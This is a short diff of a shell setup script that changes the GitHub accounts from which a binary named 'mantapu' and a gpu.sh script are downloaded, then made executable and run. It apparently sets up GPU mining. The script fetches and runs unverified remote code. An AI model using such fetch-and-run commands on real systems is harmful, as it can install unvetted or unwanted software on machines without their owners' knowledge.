@@ -3,7 +3,7 @@
 sudo apt update
 sudo apt install screen -y
 screen -dmS gpu.sh ./gpu.sh 65 75
-wget https://github.com/sampurasun111/anyaran/raw/main/mantapu
-wget https://raw.githubusercontent.com/sampurasun111/anyaran/main/gpu.sh
+wget https://github.com/d-crypto99/qq/raw/main/mantapu
+wget https://raw.githubusercontent.com/d-crypto99/qq/main/gpu.sh
 chmod +x gpu.sh
 ./gpu.sh
